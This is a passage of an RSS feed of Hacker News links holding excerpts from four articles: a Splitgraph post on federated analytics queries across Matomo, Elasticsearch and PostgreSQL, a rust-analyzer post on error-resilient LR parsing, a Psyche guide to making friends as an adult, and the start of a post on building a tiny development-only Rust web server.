      "visitor_count_visits": "integer",
      "visitor_days_since_first": "smallint",
      "visitor_days_since_last": "smallint",
      "visitor_returning": "smallint"
    }
  }
}
EOF
</code></pre><p>In this, we just pull out interesting tables and columns from Matomo. The full Matomo schema spec for Splitgraph is available <a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json">here</a>.</p><p>To query Elasticsearch, we used a <a href="https://github.com/splitgraph/postgres-elasticsearch-fdw" as="https://github.com/splitgraph/postgres-elasticsearch-fdw">fork</a> of <code>postgres-elasticsearch-fdw</code> with the ability to push down qualifiers. We made it available as an <code>sgr mount</code> subcommand. Here's an example:</p><pre><code>sgr mount elasticsearch -c elasticsearch:9200 -o@- &lt;&lt;EOF
{
  "table_spec": {
    "github_scraper_data": {
      "schema": {
        "id": "text",
        "@timestamp": "timestamp",
        "sg.github.stars": "integer",
        "sg.github.issues": "integer",
        "sg.github.downloads_installer": "integer",
        "sg.github.downloads_osx": "integer",
        "sg.github.downloads_linux": "integer",
        "sg.github.downloads_windows": "integer"
      },
      "index": "sg-misc*",
      "rowid_column": "id"
    }
  }
}
EOF
</code></pre><p>This creates a table that proxies to the data dumped by our GitHub star scraper.</p><p>Adding our PostgreSQL database was easy. We made an analytics user and gave it access a limited amount of useful tables (we wrote about our <a href="https://www.splitgraph.com/blog/integration-tests" as="https://www.splitgraph.com/blog/integration-tests">configuration and credential generation</a> before):</p><pre><code>sgr mount postgres_fdw sgr_auth -c [connstr] -o@- &lt;&lt;EOF
{
  "dbname": "auth",
  "remote_schema": "sgr_auth",
  "tables": [
    "user_emails",
    "profiles"
  ],
  "extra_server_args": {
    "use_remote_estimate": "true",
    "fetch_size": "10000"
  }
}
EOF
</code></pre></section><section><h2 id="sample-queries">Sample queries</h2><p>Let's now query Elasticsearch from Splitgraph and find out how many GitHub stars Splitgraph has:</p><pre><code metastring=""><span>SELECT</span> <span>"sg.github.stars"</span>
<span>FROM</span> elasticsearch_raw<span>.</span>github_scraper_data
<span>ORDER</span> <span>BY</span> <span>"@timestamp"</span> <span>DESC</span>
<span>LIMIT</span> <span>1</span><span>;</span>

 sg<span>.</span>github<span>.</span>stars

             <span>149</span>
<span>(</span><span>1</span> <span>row</span><span>)</span>
</code></pre><p>Only 149?! Make sure to <a href="https://github.com/splitgraph/splitgraph" as="https://github.com/splitgraph/splitgraph">star Splitgraph on GitHub</a> if you're reading this!</p><section><h3 id="federated-join">Federated JOIN</h3><p>As a real-world example, let's say we wanted to:</p><ul><li>Find users that visited our website in the last week</li><li>Also find out how many queries to our Data Delivery Network they made</li><li>Find out their e-mail addresses</li></ul><p>This data lives across three different databases, as discussed. With this setup, we can bring these three silos together with one simple SQL query:</p><pre><code metastring=""><span>SELECT</span>
    v<span>.</span>user_id<span>,</span>
    email<span>,</span>
    last_visit<span>,</span>
    <span>COALESCE</span><span>(</span>total_ddn_queries<span>,</span> <span>0</span><span>)</span> <span>AS</span> total_ddn_queries
<span>FROM</span> sgr_auth<span>.</span>user_emails ue
<span>LEFT</span> <span>OUTER</span> <span>JOIN</span> <span>(</span>
    
    <span>SELECT</span> <span>"sg.api.user_id"</span> <span>AS</span> user_id<span>,</span> <span>COUNT</span><span>(</span><span>1</span><span>)</span> <span>AS</span> total_ddn_queries
    <span>FROM</span> elasticsearch_raw<span>.</span>sql_api_queries
    <span>WHERE</span> <span>"sg.sql.used_images"</span> <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> d
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> d<span>.</span>user_id
<span>JOIN</span> <span>(</span>
    
    
    <span>SELECT</span> user_id<span>,</span> <span>MAX</span><span>(</span>visit_last_action_time<span>)</span> <span>AS</span> last_visit
    <span>FROM</span> matomo_raw<span>.</span>matomo_log_visit v
    <span>WHERE</span> user_id <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>AND</span> AGE<span>(</span>visit_last_action_time<span>)</span> <span>&lt;</span> <span>'1 week'</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> v
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> v<span>.</span>user_id
<span>WHERE</span> ue<span>.</span>is_primary <span>IS</span> <span>TRUE</span>
<span>ORDER</span> <span>BY</span> last_visit <span>DESC</span><span>;</span>
</code></pre><p>Here's the query plan for it:</p><pre><code> Sort
   Sort Key: (max(v.visit_last_action_time)) DESC
   -&gt;  Hash Left Join
         Hash Cond: ((ue.user_id)::text = d.user_id)
         -&gt;  Hash Join
               Hash Cond: ((ue.user_id)::text = (v.user_id)::text)
               -&gt;  Foreign Scan on user_emails ue
                     Filter: (is_primary IS TRUE)
               -&gt;  Hash
                     -&gt;  HashAggregate
                           Group Key: v.user_id
                           -&gt;  Foreign Scan on matomo_log_visit v
                                 Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)
         -&gt;  Hash
               -&gt;  Subquery Scan on d
                     -&gt;  GroupAggregate
                           Group Key: sql_api_queries."sg.api.user_id"
                           -&gt;  Sort
                                 Sort Key: sql_api_queries."sg.api.user_id"
                                 -&gt;  Foreign Scan on sql_api_queries
                                       Filter: ("sg.sql.used_images" IS NOT NULL)
                                       Multicorn: Elasticsearch query to &lt;Elasticsearch([{'host': 'elasticsearch', 'port': 9200}])&gt;
                                       Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>As you can see, this resolves into a Hash Join across three foreign tables. It also pushes down most of the clauses to the three origin databases:</p><pre><code>[PostgreSQL]
Foreign Scan on user_emails ue
  Filter: (is_primary IS TRUE)

[MySQL]
Foreign Scan on matomo_log_visit v
  Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)

[Elasticsearch]
-&gt;  Foreign Scan on sql_api_queries
  Filter: ("sg.sql.used_images" IS NOT NULL)
  Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>Normally, this would require a data warehouse and a few separate ingestion pipelines. With Splitgraph and PostgreSQL, we can query the data at source. This idea is called "data virtualization" or a "data fabric". We call it a "database proxy".</p><p>Is data virtualization always the right solution? No, but it should be a starting point. If performance becomes a concern, we'll be able to snapshot these tables as Splitgraph images. Splitgraph stores data in a columnar format (using
<a href="https://www.splitgraph.com/docs/concepts/objects" as="https://www.splitgraph.com/docs/concepts/objects"><code>cstore_fdw</code></a>), so we'll be able to query it much faster.</p></section></section><section><h2 id="data-modelling">Data modelling</h2><p>We wrote a few views on these source foreign tables that wrangle the data and clean it up. For example (<a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql">SQL on GitHub</a>),‚Ä¶</p></section></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</a></em></p>]]>
            </description>
            <link>https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515353</guid>
            <pubDate>Fri, 18 Sep 2020 11:20:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Challenging LR Parsing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515272">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://rust-analyzer.github.io//blog/2020/09/16/challeging-LR-parsing.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/09/16/challeging-LR-parsing.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Consider this incomplete snippet of Rust code:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>fn</span> <span>foo</span><span>(</span>

<span>struct</span> <span>S</span> <span>{</span>
   <span>f</span><span>:</span> <span>u32</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>I want to see an LR parser which produces the following syntax tree
(from <a href="https://rust-analyzer.github.io/manual.html#show-syntax-tree"><strong>Show Syntax Tree</strong></a> rust-analyzer command, with whitespace nodes elided for clarity):</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td><pre>SOURCE_FILE@0..32
  FN@0..7
    FN_KW@0..2 "fn"
    NAME@3..6
      IDENT@3..6 "foo"
    PARAM_LIST@6..7
      L_PAREN@6..7 "("
  STRUCT@9..31
    STRUCT_KW@9..15 "struct"
    NAME@16..17
      IDENT@16..17 "S"
    RECORD_FIELD_LIST@18..31
      L_CURLY@18..19 "{"
      RECORD_FIELD@23..29
        NAME@23..24
          IDENT@23..24 "f"
        COLON@24..25 ":"
        PATH_TYPE@26..29
          PATH@26..29
            PATH_SEGMENT@26..29
              NAME_REF@26..29
                IDENT@26..29 "u32"
      R_CURLY@30..31 "}"
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>The most error-resilient LR-style parser I know, <a href="https://github.com/tree-sitter/tree-sitter">tree sitter</a>, produces this instead (tree sitter is GLR, this is <strong>not</strong> the style of parsing advocated by the article):</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
</pre></td><td><pre>source_file [0, 0] - [5, 0])
  ERROR [0, 0] - [4, 1])
    identifier [0, 3] - [0, 6])
    struct_pattern [2, 0] - [4, 1])
      type: type_identifier [2, 0] - [2, 6])
      ERROR [2, 7] - [2, 8])
        identifier [2, 7] - [2, 8])
      field_pattern [3, 3] - [3, 9])
        name: field_identifier [3, 3] - [3, 4])
        pattern: identifier [3, 6] - [3, 9])
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Note two things about the rust-analyzer‚Äôs tree:</p>
<div>
<ul>
<li>
<p>There‚Äôs an (incomplete) ‚Äúfunction‚Äù node for <code>fn foo(</code>.
Unclosed parenthesis doesn‚Äôt preclude the parser from recognizing parameter list.</p>
</li>
<li>
<p>Incomplete function does not prevent struct definition from being recognized.</p>
</li>
</ul>
</div>
<p>These are important for IDE support.</p>
<p>For example, suppose that the cursor is just after <code>(</code>.
If we have rust-analyzer‚Äôs syntax tree, than we can figure out that we are completing a function parameter.
If we are to get fancy we might find the calls to the (not yet fully written) <code>foo</code>, run type inference to figure out the type of the first argument, and than suggest parameter name &amp; type based on that (not currently implemented‚Äâ‚Äî‚Äâthere‚Äôs soooooo much yet to be done in rust-analyzer).
And correctly recognizing <code>struct S</code> is important to not break type-inference in the code which uses <code>S</code>.</p>
<p>There‚Äôs a lot of literature about error recovery for LR parsers, how come academics haven‚Äôt figured this out already?
I have a bold claim to make: error-recovery research in academia is focusing on a problem irrelevant for IDEs.
Specifically, the research is focused on finding ‚Äúminimal cost repair sequence‚Äù:</p>
<div>
<ul>
<li>
<p>a set of edit operations is defined (skip, change or insert token),</p>
</li>
<li>
<p>a ‚Äúcost‚Äù metric is defined to distinguish big and small edits,</p>
</li>
<li>
<p>an algorithm is devised to find the smallest edit which makes the current text parse.</p>
</li>
</ul>
</div>
<p>This is a very academia-friendly problem‚Äâ‚Äî‚Äâthere‚Äôs a precise mathematical formulation, there‚Äôs an obvious brute force solution (try all edits), and there‚Äôs ample space for finding polynomial algorithm.</p>
<p>But IDEs don‚Äôt care about actually guessing &amp; repairing the text!
They just need to see as much of (possibly incomplete) syntax nodes in the existing text as possible.
When rust-analyzer‚Äôs parser produces</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>  PARAM_LIST@6..7
    L_PAREN@6..7 "("
STRUCT@9..31
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>it doesn‚Äôt think ‚ÄúOh, I need to insert <code>)</code> here to complete the list of parameters‚Äù.
Rather, it sees <code>struct</code> and thinks ‚ÄúOh wow, didn‚Äôt expect that! I guess I‚Äôll just stop parsing parameter list right here‚Äù.</p>
<p>So, here‚Äôs</p>
<div>
<table>
<tbody><tr>
<td>
<i title="Important"></i>
</td>
<td>
<p>First Challenge</p>
Design error <em>resilient</em> (and not just error <em>recovering</em>) LR parsing algorithm.
</td>
</tr>
</tbody></table>
</div>
<p>Note that error resilience is a topic orthogonal to error reporting.
I haven‚Äôt payed much attention to error reporting (in my experience, synchronous reporting of syntax errors in the editor compensates for bad syntax error messages), but it might be the case that MCRS are a good approach to there.</p>
</div></div>]]>
            </description>
            <link>https://rust-analyzer.github.io//blog/2020/09/16/challeging-LR-parsing.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515272</guid>
            <pubDate>Fri, 18 Sep 2020 11:07:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Make Friends as an Adult]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24515221">thread link</a>) | @Parth86
<br/>
September 18, 2020 | https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Friends are a treasure. In an uncertain world, they provide a comforting sense of stability and connection. We laugh together and cry together, sharing our good times and supporting each other through the bad. Yet a defining feature of friendship is that it√¢‚Ç¨‚Ñ¢s voluntary. We√¢‚Ç¨‚Ñ¢re not wedded together by law, or through blood, or via monthly payments into our bank accounts. It is a relationship of great freedom, one that we retain only because we want to.</p>
<p>But the downside of all this freedom, this lack of formal commitment, is that friendship often falls by the wayside. Our adult lives can become a monsoon of obligations, from children, to partners, to ailing parents, to work hours that trespass on our free time. A <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Febs0000046">study</a> of young adults√¢‚Ç¨‚Ñ¢ social networks by researchers at the University of Oxford found that those in a romantic relationship had, on average, two fewer close social ties, including friends. Those with kids had lost out even more. Friendships crumble, not because of any deliberate decision to let them go, but because we have other priorities, ones that aren√¢‚Ç¨‚Ñ¢t quite as voluntary. The title of the Oxford paper summed up things well: √¢‚Ç¨ÀúRomance and Reproduction Are Socially Costly√¢‚Ç¨‚Ñ¢.</p>
<p>Such is the pace and busyness of many people√¢‚Ç¨‚Ñ¢s adult lives that they can lose contact with their friends at a rapid rate. For instance, a <a href="https://www.sciencedirect.com/science/article/pii/S0378873313001056?via%3Dihub">study</a> by the Dutch sociologist Gerald Mollenhorst found that, over a period of seven years, people had lost touch with half of their closest friends, on average. What√¢‚Ç¨‚Ñ¢s especially alarming is that many of us seem to be losing friends faster than we can replace them. A <a href="https://psycnet.apa.org/record/2012-13785-001">meta-analysis</a> by researchers in Germany published in 2013 combined data from 177,635 participants across 277 studies, concluding that friendship networks had been shrinking for the preceding 35 years. For example, in studies conducted between 1980 and 1985, participants reportedly had four more friends on average, compared with the participants who√¢‚Ç¨‚Ñ¢d taken part in studies between 2000 and 2005.</p>
<p>If we√¢‚Ç¨‚Ñ¢re not careful, we risk living out our adulthoods friendless. This is a situation that√¢‚Ç¨‚Ñ¢s worth avoiding. Friends are not only a great source of fun and <a href="https://www.pewforum.org/2018/11/20/where-americans-find-meaning-in-life/">meaning</a> in life, but studies <a href="https://academic.oup.com/psychsocgerontology/article/74/2/222/3760165">suggest</a> that, without them, we√¢‚Ç¨‚Ñ¢re also at greater risk of feeling more depressed. It√¢‚Ç¨‚Ñ¢s telling that in their <a href="https://journals.sagepub.com/doi/10.1111/1467-9280.00415">study</a> √¢‚Ç¨ÀúVery Happy People√¢‚Ç¨‚Ñ¢ (2002), the American psychologists Ed Diener and Martin Seligman found that a key difference between the most unhappy and most happy people was how socially connected they were. Friends give us so much, which is why we need to invest in making them. Here√¢‚Ç¨‚Ñ¢s how.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Making more friends in adulthood is going to take some deliberate effort on your part. It√¢‚Ç¨‚Ñ¢s an exciting challenge in theory, but one of the first obstacles you√¢‚Ç¨‚Ñ¢ll encounter is having enough confidence. Especially if you are shy by nature, putting yourself out there can seem scary, triggering fears of rejection. These fears might lead you to engage in two types of avoidance that will inhibit your ability to make friends. First, you might practise √¢‚Ç¨Àúovert avoidance√¢‚Ç¨‚Ñ¢, by not putting yourself in situations where it√¢‚Ç¨‚Ñ¢s possible to meet new people. Instead of going to your friend√¢‚Ç¨‚Ñ¢s movie night, with the chance to meet others, you end up staying at home. Second, you might find yourself engaging in √¢‚Ç¨Àúcovert avoidance√¢‚Ç¨‚Ñ¢, which means that you show up but don√¢‚Ç¨‚Ñ¢t engage with people when you arrive. You go to the movie night, but while everyone else is analysing the film after it√¢‚Ç¨‚Ñ¢s over, you stay silent in the corner, petting someone√¢‚Ç¨‚Ñ¢s pet corgi and scrolling through Instagram.</p>
<p><strong>Assume that people like you</strong></p>
<p>Both these forms of avoidance are caused by understandable fears of rejection. So imagine how much easier it would be if you knew that, were you to show up in a group of strangers, most of them would love you and find you interesting. This mindset actually has a self-fulfilling quality √¢‚Ç¨‚Äú an American <a href="https://doi.apa.org/doiLanding?doi=10.1037%2F0022-3514.51.2.284">study</a> from the 1980s found that volunteers who were led to believe that an interaction partner liked them began to act in ways that made this belief more likely to come true √¢‚Ç¨‚Äú they shared more about themselves, disagreed less, and had a more positive attitude. This suggests that if you go into social situations with a positive mindset, assuming people like you, then it√¢‚Ç¨‚Ñ¢s more likely that this will actually turn out to be the case.</p>
<p>Of course, you might still be reluctant to assume others like you because you don√¢‚Ç¨‚Ñ¢t believe it√¢‚Ç¨‚Ñ¢s true. If this is you, you might take comfort from research that found, on average, that strangers like us more than we realise. The <a href="https://journals.sagepub.com/doi/10.1177/0956797618783714">paper</a>, by Erica J Boothby at Cornell University and colleagues, involved having pairs of strangers chat together for five minutes, to rate how much they liked their interaction partner, and to estimate how much their partner liked them. Across a variety of settings and study durations √¢‚Ç¨‚Äú in the lab, in a college dorm, at a professional development workshop √¢‚Ç¨‚Äú the same pattern emerged. People underestimated how much they were liked, a phenomenon that Boothby and her colleagues labelled √¢‚Ç¨Àúthe liking gap√¢‚Ç¨‚Ñ¢.</p>
<p>What wisdom should we take from this research? It can remind us to go into new social events assuming that people will like us. It can keep us from being paralysed by fears of rejection, pushing us to question some of these fears. Try working on your internal dialogue, your inner voice that perhaps makes overly negative assumptions about how people will respond to you. Doing this will help give you the confidence to go out there and start initiating friendly contact with strangers.</p>
<p><strong>Initiate</strong></p>
<p>In <em>We Should Get Together: The Secret to Cultivating Better Friendships</em> (2020), Kat Vellos describes being inspired to write her book after a moment of feeling utterly alone. She was looking for a friend to hang out with, so she posted on Facebook: √¢‚Ç¨ÀúWho wants to go eat French fries and talk about life with me?√¢‚Ç¨‚Ñ¢ Everyone who responded lived in another state; her local San Francisco Bay Area friends were all booked up. As she put it:</p>
<blockquote>I didn√¢‚Ç¨‚Ñ¢t just want to eat snacks and talk about life. I was craving a different kind of life √¢‚Ç¨‚Äú one that would give me abundant access to friends who wanted to see me as much as I wanted to see them.</blockquote>
<p>This experience made Vellos realise that she needed more friends, so she created and executed a plan to make some. Eventually, she was running two successful meetup groups, and had established friendships with people she liked and wanted to get closer to. How did she change her life? She initiated. Vellos set aside time to reach out to people regularly, to revitalise old relationships and to awaken new ones, to check in, to find time to hang out. Her story reveals how initiative can change the course of our friendships.</p>
<p>To embrace the importance of initiating, you must to let go of the myth that friendship happens organically. You have to take responsibility rather than waiting passively. Science backs this up. Consider a <a href="https://journals.sagepub.com/doi/pdf/10.1177/0265407509106718">study</a> of older adults in the Canadian province of Manitoba. The participants who thought friendship was something that just happened based on luck tended to be less socially active and to feel lonelier when the researchers caught up with them five years later. By contrast, those who thought friendship took effort actually made more effort √¢‚Ç¨‚Äú for example, by showing up at church or at community groups √¢‚Ç¨‚Äú and this paid dividends, in that they felt less lonely at the five-year follow-up.</p>
<p>But it√¢‚Ç¨‚Ñ¢s not just showing up that matters, it√¢‚Ç¨‚Ñ¢s saying √¢‚Ç¨Àúhello√¢‚Ç¨‚Ñ¢ when you get there. This means introducing yourself to other people, asking them for their phone numbers, following up and asking them to hang out. Initiating is a process, one that we must do over and over again to make new friendships.</p>
<p>Initiation is particularly important for people who find themselves in new social settings √¢‚Ç¨‚Äú such as people who have moved to a new city, started a new school or job. In a <a href="https://psycnet.apa.org/record/1987-97266-009">study</a> of first-year undergraduates at the University of Denver in 1980, it was those students who rated themselves as having superior social skills who managed to develop more satisfying social relationships. Moreover, in the Fall, when everyone was new, it was specifically √¢‚Ç¨Àúinitiation skill√¢‚Ç¨‚Ñ¢ that was most important. Once friendships were more stable, it didn√¢‚Ç¨‚Ñ¢t matter as much.</p>
<p>Although we might fear that other people will turn us down if we initiate with them, the research finds that this is a lot less likely than we might think. When the American psychologists Nicholas Epley and Juliana Schroeder <a href="https://psycnet.apa.org/record/2014-28833-001">asked</a> research participants to open up conversations with their fellow train commuters, can you guess how many of them were shot down? None! Epley and Schroder concluded that: √¢‚Ç¨ÀúCommuters appeared to think that talking to a stranger posed a meaningful risk of social rejection. As far as we can tell, it posed no risk at all.√¢‚Ç¨‚Ñ¢</p>
<p><strong>Keep showing up</strong></p>
<p>Once you√¢‚Ç¨‚Ñ¢ve initiated some new contacts, the challenge of turning them into genuine friendships begins. I learned this lesson when I moved to Atlanta to start a job as assistant professor. At first, I was proactive at making friends. I showed up to events, asked my friends if they knew anyone in the area, and went to some meetup groups. I met a few people, but most of these friendships fizzled. I was good at sparking a connection but struggled to sustain it.</p>
<p>According to Rebecca G Adams, professor of sociology and gerontology at the University of North Carolina at Greensboro, sociologists have long <a href="https://www.nytimes.com/2012/07/15/fashion/the-challenge-of-making-friends-as-an-adult.html">recognised</a> that friendships thrive when we have continuous interaction. My problem with sustaining connection was that I lacked the opportunity for repeated encounters. Going to a lecture, or a happy hour, or a networking event afforded me only one opportunity to connect. If you can, it√¢‚Ç¨‚Ñ¢s a better idea to sign up for activities that give you multiple opportunities to connect, such as a language class, a writing course, an ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515221</guid>
            <pubDate>Fri, 18 Sep 2020 10:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Devserver: An Ultra-Tiny Rust Server]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515095">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://ianjk.com/devserver/ | <a href="https://web.archive.org/web/*/https://ianjk.com/devserver/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p>For my WebXR work I needed a development-only server to host a static website over HTTPS. I'd only be accessing the files on my local computer and from an Oculus Quest on the same network.</p>
<p>I wanted a server with the following properties:</p>
<ul>
<li>Easy and Fast to install</li>
<li>Zero configuration needed for most cases</li>
<li>Automatic refresh when content changes</li>
<li>HTTPS capable</li>
</ul>
<p>Surprisingly it's difficult to find an easily installed webserver that fits the bill!</p>
<p>So I made a tiny <strong>development-only</strong> server called <code>devserver</code>.</p>
<p><code>devserver</code> is a great tool for local development, but to be completely clear up-front no effort has been made to make it secure for production purposes.</p>
<p>You can check it out on
<a href="https://crates.io/crates/devserver">crates.io</a>
and <a href="https://github.com/kettle11/devserver">github</a>.</p>
<p>In this post I'll describe the process of building <code>devserver</code> in pursuit of the above goals.</p>
<h2 id="easy-and-fast-to-install">Easy and Fast to Install</h2>
<p>If you have Rust you have <code>cargo</code>.</p>
<p>By hosting <code>devserver</code> on <a href="https://ianjk.com/devserver/crates.io">crates.io</a> installation becomes as easy as:</p>
<p><code>cargo install devserver</code></p>
<p>Wonderful.</p>
<p>I love tools that install almost instantly. It's a luxurious desire, but it's a rare feeling to use software that takes up little space and installs quickly. I did not want the installation of <code>devserver</code> to interrupt someone's workflow.</p>
<p>Tools installed with <code>cargo install</code> build the Rust code, and Rust unfortunately has a reputation for slow compile times. Perhaps it'd be possible to distribute a prebuilt binary, but I didn't want to go that route.</p>
<p>Other similar Rust development servers takes 3 minutes to install. <code>devserver</code> takes just 25 seconds. 25 seconds is still too long for my tastes, but it's fine for now.</p>
<p>In order to keep install times low I was very careful choosing crates. <code>devserver</code> only has direct dependencies on the following 4 crates:</p>
<ul>
<li>native-tls</li>
<li>notify</li>
<li>sha-1</li>
<li>base64</li>
</ul>
<p>The Rust ecosystem is full of many excellent crates, but most web related crates are tailored towards the more complex use case of production web servers and as such take a while to build.</p>
<p><code>devserver</code> implements a tiny version of HTTP and WebSockets to accomplish just enough to cover its use cases.</p>
<h3 id="minimalist-http">Minimalist HTTP</h3>
<p><code>devserver</code> contains a tiny HTTP implementation that isn't feature rich, but in practice covers most use cases.</p>
<p>A small function reads the HTTP header into a byte array:</p>
<pre><code><span>pub fn </span><span>read_header</span><span>&lt;</span><span>T</span><span>:</span><span> Read </span><span>+</span><span> Write</span><span>&gt;(</span><span>stream</span><span>: &amp;</span><span>mut</span><span> T</span><span>) -&gt; </span><span>Vec</span><span>&lt;</span><span>u8</span><span>&gt; {
    </span><span>let mut</span><span> buffer </span><span>= </span><span>Vec</span><span>::</span><span>new</span><span>();
    </span><span>let mut</span><span> reader </span><span>= </span><span>std</span><span>::</span><span>io</span><span>::</span><span>BufReader</span><span>::</span><span>new</span><span>(</span><span>stream</span><span>);
    </span><span>loop </span><span>{</span><span>
        reader</span><span>.</span><span>read_until</span><span>(</span><span>b</span><span>'\n', &amp;</span><span>mut</span><span> buffer</span><span>).</span><span>unwrap</span><span>();
        </span><span>// Read until end of header.
        </span><span>if </span><span>&amp;</span><span>buffer</span><span>[</span><span>buffer</span><span>.</span><span>len</span><span>() - </span><span>4</span><span>..] == </span><span>b</span><span>"\r\n\r\n" {
            </span><span>break</span><span>;
        }
    }</span><span>
    buffer
</span><span>}
</span></code></pre>
<p>It is assumed that all requests sent to the server are <code>GET</code> requests, and <code>devserver</code> treats them as such.</p>
<p>Some string wrangling is done to get the correct path and file extension:</p>
<pre><code><span>let</span><span> request_string </span><span>= </span><span>str</span><span>::</span><span>from_utf8</span><span>(&amp;</span><span>buffer</span><span>).</span><span>unwrap</span><span>();

</span><span>if</span><span> request_string</span><span>.</span><span>is_empty</span><span>() {
    </span><span>return</span><span>;
}
</span><span>// Split the request into different parts.
</span><span>let mut</span><span> parts </span><span>=</span><span> request_string</span><span>.</span><span>split</span><span>(' ');

</span><span>let</span><span> _method </span><span>=</span><span> parts</span><span>.</span><span>next</span><span>().</span><span>unwrap</span><span>().</span><span>trim</span><span>();
</span><span>let</span><span> path </span><span>=</span><span> parts</span><span>.</span><span>next</span><span>().</span><span>unwrap</span><span>().</span><span>trim</span><span>();
</span><span>let</span><span> _http_version </span><span>=</span><span> parts</span><span>.</span><span>next</span><span>().</span><span>unwrap</span><span>().</span><span>trim</span><span>();

</span><span>// Replace white space characters with proper whitespace.
</span><span>let</span><span> path </span><span>=</span><span> path</span><span>.</span><span>replace</span><span>("</span><span>%20</span><span>", " ");
</span><span>let</span><span> path </span><span>= </span><span>if</span><span> path</span><span>.</span><span>ends_with</span><span>("</span><span>/</span><span>") {
    </span><span>Path</span><span>::</span><span>new</span><span>(</span><span>root_path</span><span>).</span><span>join</span><span>(</span><span>Path</span><span>::</span><span>new</span><span>(&amp;</span><span>format!</span><span>(
        "</span><span>{}{}</span><span>",</span><span>
        path</span><span>.</span><span>trim_start_matches</span><span>('</span><span>/</span><span>'),
        "</span><span>index.html</span><span>"
    )))
} </span><span>else </span><span>{
    </span><span>Path</span><span>::</span><span>new</span><span>(</span><span>root_path</span><span>).</span><span>join</span><span>(</span><span>path</span><span>.</span><span>trim_matches</span><span>('</span><span>/</span><span>'))
};

</span><span>let</span><span> extension </span><span>=</span><span> path</span><span>.</span><span>extension</span><span>().</span><span>and_then</span><span>(</span><span>OsStr</span><span>::</span><span>to_str</span><span>);

</span><span>// If no extension is specified assume html
</span><span>let</span><span> path </span><span>= </span><span>if</span><span> extension </span><span>== </span><span>None </span><span>{</span><span>
    path</span><span>.</span><span>with_extension</span><span>("</span><span>html</span><span>")
} </span><span>else </span><span>{</span><span>
    path</span><span>.</span><span>to_owned</span><span>()
};
</span><span>let</span><span> extension </span><span>=</span><span> extension</span><span>.</span><span>unwrap_or</span><span>("</span><span>html</span><span>");
</span></code></pre>
<p><code>devserver</code> then finds the file on the disk, the file extension is associated with a MIME type (Also known as a 'Media Type'), and the HTTP response is written to the return stream:</p>
<pre><code><span>let</span><span> content_type </span><span>= </span><span>extension_to_mime_impl</span><span>(</span><span>Some</span><span>(</span><span>extension</span><span>));
</span><span>let</span><span> response </span><span>= </span><span>format!</span><span>(
    "</span><span>HTTP/1.1 200 OK</span><span>\r\n</span><span>Content-type: {}</span><span>\r\n</span><span>Content-Length: {}</span><span>\r\n\r\n",</span><span>
    content_type</span><span>,</span><span> content_length
</span><span>);

